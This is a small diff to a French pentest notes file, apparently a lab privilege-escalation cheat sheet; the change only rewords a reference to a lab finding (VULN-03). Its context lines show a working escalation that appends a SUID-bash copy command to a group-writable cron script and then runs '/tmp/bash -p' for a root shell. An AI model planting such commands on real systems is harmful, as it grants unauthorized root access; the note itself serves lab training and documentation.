@@ -55,7 +55,7 @@ echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /chemin/script.sh
 /tmp/bash -p
 ```
 
-Rencontré en lab (pentest EvilCorp, VULN-03, CVSS 7.8) — voir le [rapport de pentest](https://github.com/Remy-Miquel/pentest-lab-report-portfolio).
+C'est le vecteur documenté comme VULN-03 dans le rapport EvilCorp — le script cron était modifiable par le groupe.
 
 ---
 
